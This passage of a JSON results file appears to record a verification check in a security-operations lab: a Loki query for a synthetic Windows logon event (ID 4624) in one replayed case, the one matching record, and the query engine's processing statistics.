      "query": "{job=\"soclab\",case_id=\"case-005\",replay_run=\"release-v3-verified\",mode=\"replay_now\"} | json | event_id = 4624",
      "expected": 1,
      "observed": 1,
      "response": {
        "status": "success",
        "data": {
          "resultType": "streams",
          "result": [
            {
              "stream": {
                "case_id": "case-005",
                "channel": "Security",
                "command_line": "",
                "destination_ip": "",
                "event_data_IpAddress": "192.0.2.20",
                "event_data_LogonGuid": "{9e175872-74a3-5c6d-882c-524c742cb7dc}",
                "event_data_LogonType": "3",
                "event_data_TargetDomainName": "LAB",
                "event_data_TargetLogonId": "0x42",
                "event_data_TargetUserName": "analyst.lab",
                "event_id": "4624",
                "event_uid": "0b9366e7aa994aac453e2a2878d70f8c6853fc4baae7f37d0934c15fe516edd3",
                "host": "WS-CHAIN-LAB",
                "image": "",
                "ip": "192.0.2.20",
                "job": "soclab",
                "kind": "synthetic",
                "logon_type": "3",
                "mode": "replay_now",
                "original_timestamp": "2026-09-03T10:00:05.000000Z",
                "parent_guid": "",
                "process_guid": "",
                "provider": "Microsoft-Windows-Security-Auditing",
                "record_id": "105",
                "replay_mode": "replay_now",
                "replay_run": "release-v3-verified",
                "script_block": "",
                "service_name": "soclab",
                "source_line": "6",
                "source_sha256": "c091ae65dc770ccbb76adbe62b678d768ad5e1c137e9849917619423876b4c53",
                "target_user": "analyst.lab",
                "user": ""
              },
              "values": [
                [
                  "1791127034091239400",
                  "{\"channel\":\"Security\",\"command_line\":\"\",\"destination_ip\":\"\",\"event_data\":{\"IpAddress\":\"192.0.2.20\",\"LogonGuid\":\"{9e175872-74a3-5c6d-882c-524c742cb7dc}\",\"LogonType\":\"3\",\"TargetDomainName\":\"LAB\",\"TargetLogonId\":\"0x42\",\"TargetUserName\":\"analyst.lab\"},\"event_id\":4624,\"event_uid\":\"0b9366e7aa994aac453e2a2878d70f8c6853fc4baae7f37d0934c15fe516edd3\",\"host\":\"WS-CHAIN-LAB\",\"image\":\"\",\"ip\":\"192.0.2.20\",\"logon_type\":\"3\",\"original_timestamp\":\"2026-09-03T10:00:05.000000Z\",\"parent_guid\":\"\",\"process_guid\":\"\",\"provider\":\"Microsoft-Windows-Security-Auditing\",\"record_id\":105,\"replay_mode\":\"replay_now\",\"script_block\":\"\",\"source_line\":6,\"source_sha256\":\"c091ae65dc770ccbb76adbe62b678d768ad5e1c137e9849917619423876b4c53\",\"target_user\":\"analyst.lab\",\"user\":\"\"}"
                ]
              ]
            }
          ],
          "stats": {
            "summary": {
              "bytesProcessedPerSecond": 2599989,
              "linesProcessedPerSecond": 2976,
              "totalBytesProcessed": 9608,
              "totalLinesProcessed": 11,
              "execTime": 0.003695,
              "queueTime": 0.000591,
              "subqueries": 0,
              "totalEntriesReturned": 1,
              "splits": 0,
              "shards": 0,
              "totalPostFilterLines": 1,
              "totalStructuredMetadataBytesProcessed": 110
            },
            "querier": {
              "store": {
                "totalChunksRef": 1,
                "totalChunksDownloaded": 1,
                "chunksDownloadTime": 570200,
                "queryReferencedStructuredMetadata": false,
                "queryUsedV2Engine": false,
                "chunk": {
                  "headChunkBytes": 0,
                  "headChunkLines": 0,
                  "decompressedBytes": 9608,
                  "decompressedLines": 11,
                  "compressedBytes": 1786,
                  "totalDuplicates": 0,
                  "postFilterLines": 1,
                  "headChunkStructuredMetadataBytes": 0,
                  "decompressedStructuredMetadataBytes": 110
                },
                "chunkRefsFetchTime": 0,
                "congestionControlLatency": 0,
                "pipelineWrapperFilteredLines": 0,
                "dataobj": {
                  "prePredicateDecompressedRows": 0,
                  "prePredicateDecompressedBytes": 0,
                  "prePredicateDecompressedStructuredMetadataBytes": 0,
                  "postPredicateRows": 0,
                  "postPredicateDecompressedBytes": 0,
                  "postPredicateStructuredMetadataBytes": 0,
                  "postFilterRows": 0,
                  "pagesScanned": 0,
                  "pagesDownloaded": 0,
                  "pagesDownloadedBytes": 0,
                  "pageBatches": 0,
                  "totalRowsAvailable": 0,
                  "totalPageDownloadTime": 0
                }
              },
              "querierExecTime": 0.001176
            },
            "ingester": {
              "totalReached": 1,
              "totalChunksMatched": 0,
              "totalBatches": 1,
              "totalLinesSent": 0,
              "store": {
                "totalChunksRef": 0,
                "totalChunksDownloaded": 0,
                "chunksDownloadTime": 0,
                "queryReferencedStructuredMetadata": false,
                "queryUsedV2Engine": false,
                "chunk": {
                  "headChunkBytes": 0,
                  "headChunkLines": 0,
                  "decompressedBytes": 0,
                  "decompressedLines": 0,
                  "compressedBytes": 0,
                  "totalDuplicates": 0,
                  "postFilterLines": 0,
                  "headChunkStructuredMetadataBytes": 0,
                  "decompressedStructuredMetadataBytes": 0
                },
                "chunkRefsFetchTime": 0,
                "congestionControlLatency": 0,
                "pipelineWrapperFilteredLines": 0,
                "dataobj": {
                  "prePredicateDecompressedRows": 0,
                  "prePredicateDecompressedBytes": 0,
                  "prePredicateDecompressedStructuredMetadataBytes": 0,
                  "postPredicateRows": 0,
                  "postPredicateDecompressedBytes": 0,
                  "postPredicateStructuredMetadataBytes": 0,
                  "postFilterRows": 0,
                  "pagesScanned": 0,
                  "pagesDownloaded": 0,
                  "pagesDownloadedBytes": 0,
                  "pageBatches": 0,
                  "totalRowsAvailable": 0,
                  "totalPageDownloadTime": 0
                }
              },
              "recvWaitTime": 0.000606
            },
            "cache": {
              "chunk": {
                "entriesFound": 1,
                "entriesRequested": 1,
                "entriesStored": 0,
                "bytesReceived": 2186,
                "bytesSent": 0,
                "requests": 2,
                "downloadTime": 0,
                "queryLengthServed": 0
              },
              "index": {
                "entriesFound": 0,
                "entriesRequested": 0,
                "entriesStored": 0,
                "bytesReceived": 0,
                "bytesSent": 0,
                "requests": 0,
                "downloadTime": 0,
                "queryLengthServed": 0
              },
              "result": {
                "entriesFound": 0,
                "entriesRequested": 0,
                "entriesStored": 0,
                "bytesReceived": 0,
                "bytesSent": 0,
                "requests": 0,
                "downloadTime": 0,
                "queryLengthServed": 0
              },
              "statsResult": {
                "entriesFound": 0,
                "entriesRequested": 0,
                "entriesStored": 0,
                "bytesReceived": 0,
                "bytesSent": 0,
                "requests": 0,
                "downloadTime": 0,
                "queryLengthServed": 0
              },
              "volumeResult": {
                "entriesFound": 0,
                "entriesRequested": 0,
                "entriesStored": 0,
                "bytesReceived": 0,
                "bytesSent": 0,
                "requests": 0,
                "downloadTime": 0,
                "queryLengthServed": 0
              },
              "seriesResult": {
                "entriesFound": 0,
                "entriesRequested": 0,
                "entriesStored": 0,
                "bytesReceived": 0,
                "bytesSent": 0,
                "requests": 0,
                "downloadTime": 0,
                "queryLengthServed": 0
              },
              "labelResult": {
                "entriesFound": 0,
                "entriesRequested": 0,
                "entriesStored": 0,
                "bytesReceived": 0,
                "bytesSent": 0,
                "requests": 0,
                "downloadTime": 0,
                "queryLengthServed": 0
              },
              "instantMetricResult": {
                "entriesFound": 0,
                "entriesRequested": 0,
                "entriesStored": 0,
                "bytesReceived": 0,
                "bytesSent": 0,
                "requests": 0,
                "downloadTime": 0,
                "queryLengthServed": 0
              }
            },
            "index": {
              "totalChunks": 0,
              "postFilterChunks": 0,
              "shardsDuration": 0,
              "usedBloomFilters": false,
              "totalStreams": 0,
              "chunkRefsLookupTime": 0,
              "bloomFilterTime": 0
            }
          }
        }
      }
    },
